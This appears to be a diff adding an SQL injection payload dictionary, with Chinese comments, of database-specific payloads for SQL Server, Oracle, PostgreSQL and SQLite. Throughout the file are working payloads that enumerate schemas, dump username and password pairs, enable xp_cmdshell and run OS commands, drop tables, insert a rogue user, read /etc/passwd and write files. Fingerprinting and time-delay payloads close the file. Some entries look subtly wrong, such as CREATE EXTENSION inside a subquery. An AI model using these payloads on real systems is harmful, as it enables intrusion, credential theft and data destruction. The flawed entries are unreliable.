@@ -1,0 +1,144 @@
+# ============================================================
+# SQL Injection Payload Dictionary — 11 数据库专用 Payload
+# 用途: 针对特定数据库的专用 payload
+# 覆盖: SQL Server / Oracle / PostgreSQL / SQLite
+# ============================================================
+
+# ============================================================
+# SQL Server 专用
+# ============================================================
+
+# 版本信息
+UNION SELECT 1,@@version,N--
+UNION SELECT 1,SERVERPROPERTY('productversion'),N--
+UNION SELECT 1,SERVERPROPERTY('productlevel'),N--
+UNION SELECT 1,SERVERPROPERTY('edition'),N--
+
+# 获取数据库列表
+UNION SELECT 1,NAME,N FROM sys.databases--
+
+# 获取表名
+UNION SELECT 1,STRING_AGG(name,','),N FROM sys.tables--
+
+# 获取列名
+UNION SELECT 1,STRING_AGG(c.name,','),N FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='users'--
+
+# 获取数据（使用 FOR XML PATH 作为备选）
+UNION SELECT 1,(SELECT username + ',' + password FROM users FOR XML PATH('')),N--
+
+# 执行命令（需要 xp_cmdshell 开启）
+; EXEC xp_cmdshell 'whoami'--
+; EXEC xp_cmdshell 'dir C:\'--
+; EXEC xp_cmdshell 'ipconfig'--
+
+# 启用 xp_cmdshell（需要 sa 权限）
+; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
+
+# 堆叠查询
+; SELECT * FROM users--
+; DROP TABLE users--
+; INSERT INTO users VALUES (1,'hacker','hacked')--
+
+# ============================================================
+# Oracle 专用
+# 注意: Oracle 必须有 FROM dual，表名/列名默认大写
+# ============================================================
+
+# 版本
+UNION SELECT 1,(SELECT banner FROM v$version WHERE rownum=1),N FROM dual--
+
+# 当前用户权限
+UNION SELECT 1,(SELECT privilege FROM session_privs WHERE rownum=1),N FROM dual--
+UNION SELECT 1,(SELECT COUNT(*) FROM session_privs),N FROM dual--
+
+# 获取所有表
+UNION SELECT 1,(SELECT LISTAGG(table_name,',') FROM all_tables),N FROM dual--
+UNION SELECT 1,(SELECT LISTAGG(table_name,',') FROM user_tables),N FROM dual--
+
+# 获取列名
+UNION SELECT 1,(SELECT LISTAGG(column_name,',') FROM all_tab_columns WHERE table_name='USERS'),N FROM dual--
+UNION SELECT 1,(SELECT LISTAGG(column_name,',') FROM user_tab_columns WHERE table_name='USERS'),N FROM dual--
+
+# 获取数据（Oracle 没有 LIMIT，用 rownum）
+UNION SELECT 1,(SELECT username||'|'||password FROM users WHERE rownum=1),N FROM dual--
+UNION SELECT 1,(SELECT username||'|'||password FROM users WHERE rownum=1 AND username NOT IN (SELECT username FROM users WHERE rownum=1)),N FROM dual--
+
+# 系统命令执行（需要 java 权限）
+; BEGIN DBMS_JAVA.RUN('java.lang.Runtime.getRuntime().exec(''whoami'')'); END;--
+
+# ============================================================
+# PostgreSQL 专用
+# ============================================================
+
+# 版本
+UNION SELECT 1,version(),N--
+
+# 获取表名
+UNION SELECT 1,STRING_AGG(table_name,','),N FROM information_schema.tables WHERE table_schema='public'--
+
+# 获取列名
+UNION SELECT 1,STRING_AGG(column_name,','),N FROM information_schema.columns WHERE table_name='users'--
+
+# 获取数据
+UNION SELECT 1,STRING_AGG(username || '|' || password, ','),N FROM users--
+
+# 读取文件（需要 superuser 权限）
+UNION SELECT 1,pg_read_file('/etc/passwd',0,10000),N--
+
+# 写入文件
+UNION SELECT 1,'test',N FROM (SELECT pg_write_file('/tmp/test.txt','test'))a--
+
+# 命令执行（需要 superuser 权限，创建扩展）
+UNION SELECT 1,1,N FROM (CREATE EXTENSION IF NOT EXISTS plpython3u; SELECT * FROM (SELECT plpy.execute('whoami'))a)b--
+
+# ============================================================
+# SQLite 专用
+# 注意: SQLite 没有 information_schema
+# ============================================================
+
+# 获取表名（SQLite 使用 sqlite_master）
+UNION SELECT 1,GROUP_CONCAT(name),N FROM sqlite_master WHERE type='table'--
+
+# 获取建表语句（包含列信息）
+UNION SELECT 1,sql,N FROM sqlite_master WHERE name='users'--
+UNION SELECT 1,sql,N FROM sqlite_master WHERE name='user'--
+UNION SELECT 1,sql,N FROM sqlite_master WHERE name='admin'--
+
+# 获取所有表的建表语句
+UNION SELECT 1,GROUP_CONCAT(sql,'||'),N FROM sqlite_master WHERE type='table'--
+
+# 获取数据（SQLite 用 LIMIT）
+UNION SELECT 1,GROUP_CONCAT(username || ':' || password),N FROM users--
+
+# SQLite 版本
+UNION SELECT 1,sqlite_version(),N--
+
+# ============================================================
+# 数据库指纹识别 Payload（快速判断数据库类型）
+# ============================================================
+
+# 测试不同的 version 函数
+UNION SELECT 1,version(),N--     # MySQL / PostgreSQL
+UNION SELECT 1,@@version,N--      # SQL Server / MySQL
+UNION SELECT 1,(SELECT banner FROM v$version WHERE rownum=1),N FROM dual--   # Oracle
+
+# 测试字符串拼接
+UNION SELECT 1,'a'||'b',N--      # Oracle / PostgreSQL → 'ab'
+                                 # MySQL → 0（当作逻辑OR）
+                                 # SQL Server → 'ab'（早期版本报错）
+
+UNION SELECT 1,'a'+'b',N--       # SQL Server → 'ab'
+                                 # MySQL → 0
+
+# 测试时间函数
+UNION SELECT 1,SLEEP(5),N--      # MySQL
+UNION SELECT 1,PG_SLEEP(5),N--   # PostgreSQL
+; WAITFOR DELAY '0:0:5'--        # SQL Server
+
+# 测试 LIMIT 语法
+UNION SELECT 1,2,N LIMIT 1--     # MySQL / PostgreSQL → 正常
+                                 # SQL Server / Oracle → 报错
+
+# 测试 FROM dual（Oracle 必须）
+UNION SELECT 1,2,N FROM dual--   # Oracle → 正常
+                                 # 其他 → 报错 "dual" 不存在
